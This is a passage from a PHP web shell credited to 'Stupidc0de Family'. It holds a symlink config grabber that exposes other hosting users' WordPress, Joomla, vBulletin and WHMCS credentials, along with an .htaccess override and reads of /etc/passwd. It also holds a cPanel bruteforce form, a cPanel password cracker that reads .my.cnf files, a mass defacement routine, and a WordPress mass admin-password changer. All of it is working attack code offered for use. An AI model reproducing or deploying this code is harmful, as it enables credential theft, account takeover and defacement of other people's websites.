 symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 } $d0mains = @file("/etc/named.conf");
 if($d0mains) { mkdir($fn);
 chdir($fn);
 foreach($d0mains as $d0main) { if(eregi("zone",$d0main)) { preg_match_all('#zone "(.*)"#', $d0main, $domains);
 flush();
 if(strlen(trim($domains[1][0])) > 2) { $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
 syml($user['name'],$domains[1][0]);
 } } } echo "<center><font color=springgreen size=3>Done</font></center>";
 echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>";
 } else { mkdir($fn);
 chdir($fn);
 $temp = "";
 $val1 = 0;
 $val2 = 1000;
 for(;
$val1 <= $val2;
$val1++) { $uid = @posix_getpwuid($val1);
 if ($uid) $temp .= join(':',$uid)."
";
 } echo '<br/>';
 $temp = trim($temp);
 $file5 = fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);
 $htaccess = 'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
			aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
			biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
			';
 $file = fopen(".htaccess","w+");
 $write = fwrite ($file ,base64_decode($htaccess));
 $file = fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)) { $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named") continue;
 syml($matches,$matches);
 } fclose($file);
 echo "</table>";
 unlink("test.txt");
 echo "<center><font color=springgreen size=3>Done</font></center>";
 echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>";
 } echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
 exit;
 } 
?>
			<form method="POST" target="_blank">
			<input name="page" type="hidden" value="find">
				<table border=1>
				<body bgcolor="black" text="white"><br><br>
			 
				<center><b><font size="2" style="italic" color="white">Cpanel BruteForce<br><br></b></center></td></tr>
			 <tr>
			 <td>
				<strong>User :</strong>
				</td>
				<td>
				<strong><textarea cols="50" style="background:#191818;
outline:none;
color:white;
" rows="5" name="usernames">
<?php system('ls /var/mail');

?></textarea></strong>
			 </td>
			 <tr>
			 <td>
				<strong>Pass :</strong>
				</td>
				<td>
			 <strong><textarea cols="50" style="background:#191818;
outline:none;
color:white;
" rows="5" name="passwords"></textarea></strong>
				</td>
			 </tr>
			 <tr>
			 <td>
				<strong>Type :</strong>
				</td>
			 <td>
			 <span style="background:#191818;
outline:none;
color:white;
"><strong>Simple : </strong> </span>
				<strong>
				<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
			 <font style="background:black;
outline:none;
color:white;
"><strong>/etc/passwd : </strong> </font>
				<strong>
				<input type="radio" name="type" value="passwd" style="background:black;
outline:none;
color:white;
"></strong><span class="style3"><strong>
				</strong>
				</span>
			 <td style="background:black;
outline:none;
color:white;
" >
			 <strong><input class ='bordergaya' type="submit" value="START"></strong>
			 </td>
			 </tr>
				</table>
				<br>
				<table border=1>
			</form> 
			<tr>
			 <td style="background:black;
outline:none;
color:white;
">
					<strong>Get Wordlist</strong>
			<form method="POST" target="_blank">
				<strong>
			<input name="pass" type="hidden" value="password"> 				
			 </strong>
			 <strong>Url Config :</strong>
				<td>
					
			 <strong>
					<input style="background:black;
outline:none;
color:white;
" size="80" name="url" type="text"></strong>
				
			 <td style="background:black;
outline:none;
color:white;
"><strong><input class ='bordergaya' type="submit" value="GO">
			 </strong>
			 </td>
				</table>
				
<?php echo"<br/><br/>";
 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'massde')) { 
?></center></center>
<style type="text/css">
	.ketengah{
	text-align: left;
	font-size: 16px;
	color: orange;
	font-family: Ubuntu Mono;
	margin-left: 30%;
</style>

<?php function sabun_massal($path,$namafile,$isi_script) { if(is_writable($path)) { $patha = scandir($path);
 foreach($patha as $pathb) { $pathc = "$path/$pathb";
 $lokasi = $pathc.'/'.$namafile;
 if($pathb === '.') { file_put_contents($lokasi, $isi_script);
 } elseif($pathb === '..') { file_put_contents($lokasi, $isi_script);
 } else { if(is_dir($pathc)) { if(is_writable($pathc)) { echo "<font class='ketengah'><font color=crimson>-:-</font><font color=white>Sukses Bos Q</font><font color=crimson>-:-</font> <font color=springgreen>Cek di :</font> $lokasi</font><br>";
 file_put_contents($lokasi, $isi_script);
 $idx = sabun_massal($pathc,$namafile,$isi_script);
 } } } } } } if($_POST['start']) { echo "<div style='margin: 5px auto;
 padding: 5px'>";
 sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
 echo "</div>";
 } else { echo "<center>";
 echo "<form method='post'><br><br>
	<table>
	<tr>
		<td><font style='text-decoration: underline;
 margin-left:10px;
'>Folder</font></td>
		<td align='center'>:</td>
		<td><input class='justborder' type='text' name='d_dir' value='$path' style='width: 95%;
' height='10'><br></td>
	</tr>
	<tr>
		<td><font style='text-decoration: underline;
 margin-left:10px;
'>Filename</font></td>
		<td align='center'>:</td>
		<td><input class='justborder' type='text' name='d_file' value='hacked.html' style='width: 95%;
' height='10'><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><font style='text-decoration: underline;
'>Script Deface : </font><br></td>
	</tr>
	<tr>
	<td colspan='3'><textarea class='justborder' name='script' style='width: 500px;
 height: 200px;
'>Hacked by Stupidc0de Family!</textarea><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;
'><br/></td>
	</tr>
	</table><br><br><br>
	</form></center><br/>";
 }

?><center><center>
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'mpc')) { 
?>
				<form action="?path=
<?php echo $path;
 
?>&amp;
x=mpc" method="post">
				
<?php set_time_limit(0);
 ini_set('display_errors', 0);
 echo '<center><h2>WordPress Mass Password Changer</h2><br /><br/></center>';
 echo '<form method="POST" action="" >
			<center><table border="1" class="justborder"><tr><td>Config List:</td>
			<td><textarea class="justborder" name="url" cols="50" rows="10" ></textarea></td></tr>
			<tr><td>User/Password</td><td><input class="justborder" type="text" name="username" size="25" value="Kato"> / 
			<input class="justborder" type="text" name="password" size="25" value="Megumi"></td></tr></table>
			<br><input class="bordergaya" type="Submit" class="button" value="Submit"><input type="hidden" name="action" value="1"></form></center>';
 if ($_POST['action']=='1'){ if ($_POST['url']==''){ echo "<div class='result'>No CONFIG FOUND<br>Make sure you provided a config list!</div><br>";
 }else{ $url=$_POST['url'];
 $users = explode("
",$url);
 foreach ($users as $user) { $user1=trim($user);
 $code=file_get_contents2($user1);
 preg_match_all('|define.*\(.*\'DB_NAME\'.*,.*\'(.*)\'.*\).*;
|isU',$code,$b1);
 $db=$b1[1][0];
 preg_match_all('|define.*\(.*\'DB_USER\'.*,.*\'(.*)\'.*\).*;
|isU',$code,$b2);
 $user=$b2[1][0];
 preg_match_all('|define.*\(.*\'DB_PASSWORD\'.*,.*\'(.*)\'.*\).*;
|isU',$code,$b3);
 $db_password=$b3[1][0];
 preg_match_all('|define.*\(.*\'DB_HOST\'.*,.*\'(.*)\'.*\).*;
|isU',$code,$b4);
 $host=$b4[1][0];
 preg_match_all('|\$table_prefix.*=.*\'(.*)\'.*;
|isU',$code,$b5);
 $p=$b5[1][0];
 $d=@mysql_connect( $host, $user, $db_password ) ;
 if ($d){ @mysql_select_db($db );
 $usern=$_POST['username'];
 $passwd=$_POST['password'];
 $sql = "UPDATE `".$p."users` SET `user_pass` = MD5( '".$passwd."' ) WHERE `ID` = '1';
";
 @mysql_query($sql) ;
 ;
 $sql = "UPDATE `".$p."users` SET `user_login` = '".$usern."' WHERE `ID` = '1';
";
 @mysql_query($sql) ;
 ;
 $aa=@mysql_query("select option_value from `".$p."options` WHERE `option_name` = 'siteurl';
") ;
;
 $siteurl=@mysql_fetch_array($aa) ;
 $siteurl=$siteurl['option_value'];
 $tr.="$siteurl
";
 mysql_close();
 } } if ($tr) $filename = 'changed.txt';
 $fp = fopen($filename, "a+");
 $write = fputs($fp, $tr);
 fclose($fp);
 echo "<div class='result'>Password Changing Completed ! :)<br><br>";
 echo "<a href='changed.txt' target='_blank'>View List of Password Changed Sites</a></div><br/>";
 } } function file_get_contents2($u){ $ch = curl_init();
 curl_setopt($ch,CURLOPT_URL,$u);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
 curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1;
 WOW64;
 rv:12.0) Gecko/20100101 Firefox/12.0 ");
 $result = curl_exec($ch);
 return $result ;
 } echo "<br /><br />";
 
 
?>
				
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'masstool')) { echo "<br/><br/>###<br/><br/>";
 
?>
					<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=massde"><input class=bordergaya type=submit value="Mass Deface" /></a>
					Or <a href="?
<?php echo "path=".$path;
 
?>&amp;
x=mpc"><input class=bordergaya type=submit value="Wordpress Mass Password Changer" /></a>
					Or <a href="?
<?php echo "path=".$path;
 
?>&amp;
x=zonesH"><input class=bordergaya type=submit value="Zone-H Mass Notifier" /></a>
				
					
<?php 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'tentang')) { echo"<br><br>
					<center><b>
			<font face='Jolly Lodger' color='white' size='6px'> [+] Stupidc<font color='teal'>0</font>de Family [+]</font><br>
					<br>
			<font face='Fredericka The Great' color='white' size='3px'>&hearts;
 Respect Us, Little Crazy Family From Indonesia ^_^ &hearts;
<br><br>
			-:- No Leader We Just Laugh Together -:-</font><br><br>
			<font color='gray'> http://www.stupidc0de.family/ </font><br><br><br>
			</center>
					</b>";
 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'cpanel')) { echo "<br/><br/>###<br/><br/>";
 
?>
						
					<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=brute"><input class=bordergaya type=submit value="Cpanel Bruteforce" /></a>
					Or <a href="?
<?php echo "path=".$path;
 
?>&amp;
x=cpcrack"><input class=bordergaya type=submit value="Auto Cpanel Finder/Cracker" /></a>
					<br/><br/><br/><br/>
				
<?php 
 
?>
				
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'cpcrack')) { 
?>
							<form action="?path=
<?php echo $path;
 
?>&amp;
x=cpcrack" method="post">
				
<?php @ini_set('display_errors',0);
 function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){ $ar0=explode($marqueurDebutLien, $text);
 $ar1=explode($marqueurFinLien, $ar0[$i]);
 return trim($ar1[0]);
 } echo '<h1>Cpanel Finder/Cracker</h1><br/>';
 echo "<center>";
 $d0mains = @file('/etc/named.conf');
 $domains = scandir("/var/named");
 if ($domains or $d0mains) { $domains = scandir("/var/named");
 if($domains) { echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
 $count=1;
 $dc = 0;
 $list = scandir("/var/named");
 foreach($list as $domain){ if(strpos($domain,".db")){ $domain = str_replace('.db','',$domain);
 $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 $dirz = '/home/'.$owner['name'].'/.my.cnf';
 $path = getcwd();
 if (is_readable($dirz)) { copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
 $p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
 $password=entre2v2($p,'password="','"');
 echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
 $dc++;
 } } } echo '</table>';
 $total = $dc;
 echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
 echo '</center>';
 }else{ $d0mains = @file('/etc/named.conf');
 if($d0mains) { echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
 $count=1;
 $dc = 0;
 $mck = array();
 foreach($d0mains as $d0main){ if(@eregi('zone',$d0main)){ preg_match_all('#zone "(.*)"#',$d0main,$domain);
 flush();
 if(strlen(trim($domain[1][0])) >2){ $mck[] = $domain[1][0];
 } } } $mck = array_unique($mck);
 $usr = array();
 $dmn = array();
 foreach($mck as $o) { $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
 $usr[] = $infos['name'];
 $dmn[] = $o;
 } array_multisort($usr,$dmn);
 $dt = file('/etc/passwd');
 $passwd = array();
 foreach($dt as $d) { $r = explode(':',$d);
 if(strpos($r[5],'home')) { $passwd[$r[0]] = $r[5];
 } } $l=0;
 $j=1;
 foreach($usr as $r) { $dirz = '/home/'.$r.'/.my.cnf';
 $path = getcwd();
 if (is_readable($dirz)) { copy($dirz, ''.$path.'/'.$r.'.txt');
 $p=file_get_contents(''.$path.'/'.$r.'.txt');
 $password=entre2v2($p,'password="','"');
 echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
 $dc++;
 flush();
 $l=$l?0:1;
 $j++;
 } } } echo '</table>';
 $total = $dc;
 echo '<br><h3>Total cPanel Found = '.$total.'</h3><br />';
 echo '</center>';
 } }else{ echo "<h3><i><font color='red'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>etc/named.conf</font> Not Accessible!</i></h3>";
 } echo "</body></html>";
 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'vn')) { 
?>
					<form action="?path=
<?php echo $path;
 
?>&amp;
x=vn" method="post">
					<center><h2>Domain Viewer</h2></center><br><br>
					
<?php function openBaseDir() { $openBaseDir = ini_get("open_basedir");
 if (!$openBaseDir) { $openBaseDir = '<font color="green">OFF</font>';
 } else { $openBaseDir = '<font color="red">ON</font>';
 } return $openBaseDir;
 } echo '
				 <table width="95%" cellspacing="0" cellpadding="0" >
				 <td height="100" align="left" >';
 $pg = basename(__FILE__);
 $safe_mode = @ini_get('safe_mode');
 $dir = @getcwd();
 @mkdir('pee',0777);
 @symlink("/","pee/root");
 $htaccss = "Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				 AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any";
 file_put_contents("pee/.htaccess",$htaccss);
 $etc = file_get_contents("/etc/passwd");
 $etcz = explode("
",$etc);
 foreach($etcz as $etz){ $etcc = explode(":",$etz);
 error_reporting(0);
 $current_dir = posix_getcwd();
 $dir = explode("/",$current_dir);
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
